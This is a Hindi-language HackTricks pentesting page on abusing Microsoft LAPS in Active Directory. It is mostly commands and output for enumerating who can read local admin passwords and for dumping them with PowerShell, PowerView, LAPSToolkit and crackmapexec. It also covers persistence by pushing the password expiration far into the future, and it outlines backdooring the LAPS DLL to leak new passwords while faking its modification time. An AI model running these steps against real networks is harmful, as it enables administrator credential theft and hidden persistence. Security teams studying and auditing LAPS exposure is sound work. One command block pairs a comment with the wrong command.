# LAPS

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **अपने हैकिंग ट्रिक्स साझा करें, [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) पर PR जमा करके**।

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## मूल जानकारी

लोकल व्यवस्थापक पासवर्ड समाधान (LAPS) एक उपकरण है जो एडमिनिस्ट्रेटर पासवर्ड को प्रबंधित करने के लिए उपयोग किया जाता है, जो **अद्वितीय, यादृच्छिक और नियमित रूप से बदलते** हैं, जो डोमेन-संयुक्त कंप्यूटरों पर लागू होते हैं। ये पासवर्ड सुरक्षित रूप से एक्टिव डायरेक्टरी में संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं तक ही पहुंचने के लिए उपयोगकर्ताओं को पहुंचाया गया है जिन्हें पहुंचने की अनुमति प्राप्त कराई गई है एक्सेस कंट्रोल सूची (ACLs) के माध्यम से। क्लाइंट से सर्वर तक पासवर्ड ट्रांसमिशन की सुरक्षा को **करोबेरोस संस्करण 5** और **एडवांस्ड एन्क्रिप्शन स्टैंडर्ड (AES)** के उपयोग से सुनिश्चित किया जाता है।

एलेपीएस के कार्यान्वयन से डोमेन कंप्यूटर ऑब्जेक्ट्स में दो नए विशेषताएँ जोड़ी जाती हैं: **`ms-mcs-AdmPwd`** और **`ms-mcs-AdmPwdExpirationTime`**। ये विशेषताएँ **सादा-पाठ व्यवस्थापक पासवर्ड** और **इसकी समाप्ति समय** को संग्रहित करती हैं।

### जांचें कि क्या सक्रिय है
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS पासवर्ड एक्सेस

आप **`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol`** से **रॉ LAPS नीति डाउनलोड** कर सकते हैं और फिर [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) पैकेज से **`Parse-PolFile`** का उपयोग इस फ़ाइल को मानव-पठनीय स्वरूप में परिवर्तित करने के लिए किया जा सकता है।

इसके अतिरिक्त, यदि वे किसी मशीन पर स्थापित हैं जिसका हमारे पास पहुंच है, तो **नेटिव LAPS PowerShell cmdlets** का उपयोग किया जा सकता है:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** का उपयोग करके यह भी पता लगाया जा सकता है **कौन पासवर्ड को पढ़ सकता है और इसे पढ़ सकता है**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) एलएपीएस की जांच को कई कार्यों के साथ सुविधाजनक बनाता है।
इनमें से एक है **`ExtendedRights`** का **समाचयन करना** **लैप्स सक्षम सभी कंप्यूटरों** के लिए। यह दिखाएगा **समूह** विशेष रूप से **लैप्स पासवर्ड पढ़ने के लिए सम्मन्वित**, जो अक्सर सुरक्षित समूहों में उपयोगकर्ता होते हैं।
एक **खाता** जिसने एक कंप्यूटर को एक डोमेन से जोड़ दिया है, उस होस्ट पर `सभी विस्तारित अधिकार` प्राप्त करता है, और यह अधिकार **खाते** को **पासवर्ड पढ़ने** की क्षमता देता है। सूचीकरण एक उपयोगकर्ता खाता दिखा सकता है जो एक होस्ट पर लैप्स पासवर्ड पढ़ सकता है। यह हमें मदद कर सकता है **निश्चित एडी उपयोगकर्ताओं** को लैप्स पासवर्ड पढ़ने के लिए लक्षित करने में।
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Crackmapexec के साथ LAPS पासवर्ड डंपिंग**
यदि powershell तक पहुंच नहीं है, तो आप LDAP के माध्यम से दूरस्थ रूप से इस विशेषाधिकार का दुरुपयोग कर सकते हैं।
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **LAPS Persistence**

### **समाप्ति तिथि**

एक बार एडमिन बनने के बाद, यह संभव है कि आप **पासवर्ड** प्राप्त कर सकें और एक मशीन को **पासवर्ड** अपडेट करने से **रोकने** के लिए **समाप्ति तिथि को भविष्य में** सेट करके रखें।
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
अगर **एडमिन** **`Reset-AdmPwdPassword`** cmdlet का उपयोग करता है; या अगर LAPS GPO में **जरूरी नीति से अधिक समय तक पासवर्ड समाप्ति की अनुमति नहीं है** तो पासवर्ड फिर से रीसेट हो जाएगा।
{% endhint %}

### बैकडोर

LAPS के मूल स्रोत कोड [यहाँ](https://github.com/GreyCorbel/admpwd) पाया जा सकता है, इसलिए कोड में एक बैकडोर डालना संभव है (उदाहरण के लिए `Main/AdmPwd.PS/Main.cs` में `Get-AdmPwdPassword` विधि के अंदर) जो किसी प्रकार से **नए पासवर्ड को बाहर ले जाए या कहीं स्टोर कर दे**।

फिर, नया `AdmPwd.PS.dll` को कंपाइल करें और इसे मशीन में `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` में अपलोड करें (और संशोधन समय बदलें)।

## संदर्भ
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का हैकट्रिक्स में विज्ञापन देखना चाहते हैं**? या क्या आप PEASS के **नवीनतम संस्करण या हैकट्रिक्स को पीडीएफ में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जांच करें!
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family) की खोज करें
* प्राप्त करें [**आधिकारिक PEASS और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें, [हैकट्रिक्स रेपो](https://github.com/carlospolop/hacktricks) और [हैकट्रिक्स-क्लाउड रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके**।

</details>
